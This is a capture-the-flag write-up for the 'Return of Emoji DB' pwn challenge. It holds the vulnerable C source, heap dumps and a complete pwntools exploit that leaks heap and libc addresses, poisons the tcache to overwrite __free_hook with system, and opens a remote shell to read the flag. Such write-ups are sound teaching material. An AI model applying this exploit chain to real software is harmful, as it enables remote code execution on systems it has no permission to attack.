## Return of Emoji DB

> Points: 600
>
> Solves: 25 (?)

### Description:
```
Challenge instance ready at 193.57.159.27:42454. Click here to request a new instance.

Emoji-based pwn is the hot new thing!
```

### Files:
```
emoji.zip

```

## Analysis:

The C language source code is provided below.
There is a vulnerability in the emoji string part of the add_emoji () function.

```c
#define _CRT_SECURE_NO_WARNINGS
#include <unistd.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

ssize_t read(int fd, void *buf, size_t count);
ssize_t write(int fd, const void *buf, size_t count);

typedef struct __attribute__((__packed__)) EmojiEntry {
    uint8_t data[4];
    char* title;
} entry;

entry* entries[8] = {0};
void* garbage[50] = {0};

int find_free_slot(uint64_t * arr, int size) {
    for (int i = 0; i < size; i++) {
        if (arr[i] == 0) {
            return i;
        }
    }
    return -1;
}

int menu() {
    printf("Emoji DB v 2.1\n1) Add new Emoji\n2) Read Emoji\n3) Delete Emoji\n4) Collect Garbage\n> ");
    unsigned int res;
    scanf("%ud\n", &res);
    return res;
}

int count_leading_ones(unsigned char i) {
    int count = 0;
    while ((i & 0b10000000) > 0) {
        count += 1;
        i = i << 1;
    }
    return count;
}

void add_emoji() {
    int i = find_free_slot((uint64_t *)entries, sizeof(entries));
    if (i < 0) {
        puts("No free slots");
        return;
    }
    entry* new_entry = (entry *)malloc(sizeof(entry));
    new_entry->title = malloc(0x80);
    printf("Enter title: ");
    read(0, new_entry->title, 0x80 - 1);
    new_entry->title[0x80-1] = '\0';
    printf("Enter emoji: ");
    read(0, new_entry->data, 1);
    read(0, new_entry->data+1, count_leading_ones(new_entry->data[0]) - 1);
    entries[i] = new_entry;
}

void read_emoji() {
    printf("Enter index to read: ");
    unsigned int index;
    scanf("%ud", &index);
    if (index > sizeof(entries) | entries[index] == NULL) {
        puts("Invalid entry");
        return;
    }
    printf("Title: %s\nEmoji: ", entries[index]->title);
    write(1, entries[index]->data, count_leading_ones(entries[index]->data[0]));

}

void delete_emoji() {
    printf("Enter index to delete: ");
    unsigned int index;
    scanf("%ud", &index);
    if (index > sizeof(entries) | entries[index] == NULL) {
        puts("Invalid entry");
        return;
    }
    int i = find_free_slot((uint64_t *)garbage, sizeof(garbage));
    garbage[i] = entries[index];
    int i2 = find_free_slot((uint64_t *)garbage, sizeof(garbage));
    garbage[i2] = entries[index]->title;
    entries[index]->title = NULL;
    entries[index] = NULL;

}

void collect_garbage() {
    for (int i = 0; i < sizeof(garbage); i++) {
        if (garbage[i] != NULL) {
            free(garbage[i]);
            garbage[i] = NULL;
        }
    }
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    int c = menu();
    while (c < 5) {
        switch (c) {
        case 1:
            add_emoji();
            break;
        case 2:
            read_emoji();
            break;
        case 3:
            delete_emoji();
            break;
        case 4:
            collect_garbage();
            break;
        default:
            puts("Unknown option");
        }
        c = menu();
    }
}
```

## Solution:

heap leak is easy.

With Add("A"*0x8, "\xf8"+"\xb4"*4)、We can leak the heap address by changing the part of the 0x55555555a2b0 chunk that points to 0x55555555a2b4 from 0x55555555a2d0.

```asm
0x55555555a2a0:	0x0000000000000000	0x0000000000000021
0x55555555a2b0:	0x5555a2b4b4b4b4f8	0x0000000000005555   --- 0x55555555a2d0 => 0x55555555a2b4
0x55555555a2c0:	0x0000000000000000	0x0000000000000091
0x55555555a2d0:	0x4141414141414141	0x000000000000000a
```

Similarly, we can leak the libc address by malloc() and free() eight 0x80 size chunks.

In addition, we can create a fake chunk (0x55555555a710) and replace the 0x55555555a620 chunk with 0x55555555a710 to overlap the chunks and put the `__free_hook` in the tcache.

```asm
x55555555a600:	0x0000000000000000	0x0000000000000000
0x55555555a610:	0x0000000000000000	0x0000000000000021
0x55555555a620:	0x5555a710676767fc	0x0000000000005555
0x55555555a630:	0x0000000000000000	0x0000000000000091
0x55555555a640:	0x4747474747474747	0x000000000000000a
0x55555555a650:	0x0000000000000000	0x0000000000000000
0x55555555a660:	0x0000000000000000	0x0000000000000000
0x55555555a670:	0x0000000000000000	0x0000000000000000
0x55555555a680:	0x0000000000000000	0x0000000000000000
0x55555555a690:	0x0000000000000000	0x0000000000000000
0x55555555a6a0:	0x0000000000000000	0x0000000000000000
0x55555555a6b0:	0x0000000000000000	0x0000000000000000
0x55555555a6c0:	0x0000000000000000	0x0000000000000021
0x55555555a6d0:	0x5555a6f05555a60a	0x0000000000005555
0x55555555a6e0:	0x0000000000000000	0x0000000000000091
0x55555555a6f0:	0x4646464646464646	0x4646464646464646
0x55555555a700:	0x4646464646464646	0x0000000000000091
0x55555555a710:	0x000000000000000a	0x0000000000000000
0x55555555a720:	0x0000000000000000	0x0000000000000000
0x55555555a730:	0x0000000000000000	0x0000000000000000
0x55555555a740:	0x0000000000000000	0x0000000000000000
0x55555555a750:	0x0000000000000000	0x0000000000000000
0x55555555a760:	0x0000000000000000	0x0000000000000000
0x55555555a770:	0x0000000000000000	0x0000000000000021
```
Below is the result of putting `__free_hook` in tcache.
```
pwndbg> bins
tcachebins
0x20 [  5]: 0x55555555a570 —▸ 0x55555555a620 —▸ 0x55555555a4c0 —▸ 0x55555555a410 —▸ 0x55555555a360 ◂— 0x0
0x90 [  5]: 0x55555555a590 —▸ 0x55555555a710 —▸ 0x7ffff7fadb28 (__free_hook) ◂— 0x0
fastbins
0x20: 0x55555555a820 ◂— 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x55555555a840 —▸ 0x7ffff7faabe0 (main_arena+96) ◂— 0x55555555a840
smallbins
empty
largebins
empty
```

## Exploit code:
```python
from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './emoji'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "193.57.159.27"
  PORT = 28933
  s = remote(HOST, PORT)
  libc = ELF("./libc-2.31.so")
else:
  s = process(BINARY)
  libc = elf.libc

def Add(title, emoji):
  s.sendlineafter("> ", "1")
  s.sendlineafter("title: ", title)
  s.sendlineafter("emoji: ", emoji)
  
def Read(idx):
  s.sendlineafter("> ", "2")
  s.sendlineafter("read: ", str(idx))
  
def Delete(idx):
  s.sendlineafter("> ", "3")
  s.sendlineafter("delete: ", str(idx))
  
def GC():
  s.sendlineafter("> ", "4")

# heap leak
Add("A"*0x8, "\xf8"+"\xb4"*4)
Read(0)
s.recvuntil("Title: ")
r = s.recvuntil("\n")[:-1]
heap_leak = u64(r + b"\x00\x00")
heap_base = heap_leak - 0x12b4
print("heap_leak =", hex(heap_leak))
print("heap_base =", hex(heap_base))

for i in range(7):
  Add("B"*0x8, "") 

for i in range(7):
  Delete(i+1)
Add("C"*0x8, "")
Add("D"*0x8, "")
Delete(1)
GC()

# libc leak
Add("E"*0x8, b"\xfc"+b"e"*3+p64(heap_base+0x1850)[:2])
Read(1)
s.recvuntil("Title: ")
r = s.recvuntil("\n")[:-1]
libc_leak   = u64(r + b"\x00\x00")
libc_base   = libc_leak - 0x1ebbe0
free_hook   = libc_base + libc.sym.__free_hook
system_addr = libc_base + libc.sym.system
print("libc_leak =", hex(libc_leak))
print("libc_base =", hex(libc_base))

# Overlap chunk
Add(b"F"*0x18+p64(0x91), "")
Add("G"*8, b"\xfc"+b"g"*3+p64(heap_base+0x1710)[:2])
Add("H"*0x8, "")

Delete(4)
Delete(5)
Delete(3)
GC()

Add(b"I"*0x18+p64(0x91)+p64(free_hook), "")

Add("/bin/sh\x00", "") 
Add("J"*8, "") 
Add(p64(system_addr), "")

# start /bin/sh
Delete(4)
GC()

s.interactive()
```

## Results:
```bash
mito@ubuntu:~/CTF/RaRCTF_2021/Pwn_Return_of_Emoji_DB_600/Emoji$ python3 solve.py r
[*] '/home/mito/CTF/RaRCTF_2021/Pwn_Return_of_Emoji_DB_600/Emoji/emoji'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 193.57.159.27 on port 28933: Done
[*] '/home/mito/CTF/RaRCTF_2021/Pwn_Return_of_Emoji_DB_600/Emoji/libc-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
heap_leak = 0x5644234ec2b4
heap_base = 0x5644234eb000
libc_leak = 0x7efe7f849be0
libc_base = 0x7efe7f65e000
[*] Switching to interactive mode
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ ls -l
total 28
lrwxrwxrwx.    1 root root     7 Jul 23 17:35 bin -> usr/bin
drwxr-xr-x.    2 root root     6 Apr 15  2020 boot
drwxr-xr-x.    5 root root   340 Aug 10 01:16 dev
-rwxr-xr-x.    1 root root 20912 Aug  6 10:27 emoji
drwxr-xr-x.    1 root root    66 Aug  8 15:06 etc
-rw-r--r--.    1 root root    38 Aug  3 01:39 flag.txt
drwxr-xr-x.    1 root root    17 Aug  8 14:53 home
lrwxrwxrwx.    1 root root     7 Jul 23 17:35 lib -> usr/lib
lrwxrwxrwx.    1 root root     9 Jul 23 17:35 lib32 -> usr/lib32
lrwxrwxrwx.    1 root root     9 Jul 23 17:35 lib64 -> usr/lib64
lrwxrwxrwx.    1 root root    10 Jul 23 17:35 libx32 -> usr/libx32
drwxr-xr-x.    2 root root     6 Jul 23 17:35 media
drwxr-xr-x.    2 root root     6 Jul 23 17:35 mnt
drwxr-xr-x.    2 root root     6 Jul 23 17:35 opt
dr-xr-xr-x. 1366 root root     0 Aug 10 01:16 proc
drwx------.    2 root root    37 Jul 23 17:38 root
drwxr-xr-x.    5 root root    58 Jul 23 17:38 run
lrwxrwxrwx.    1 root root     8 Jul 23 17:35 sbin -> usr/sbin
drwxr-xr-x.    2 root root     6 Jul 23 17:35 srv
dr-xr-xr-x.   13 root root     0 Aug 10 01:14 sys
drwxrwxrwt.    2 root root     6 Jul 23 17:38 tmp
drwxr-xr-x.    1 root root    41 Jul 23 17:35 usr
drwxr-xr-x.    1 root root    17 Jul 23 17:38 var
$ cat flag.txt
rarctf{tru5t_th3_f1r5t_byt3_1bc8d429}

```





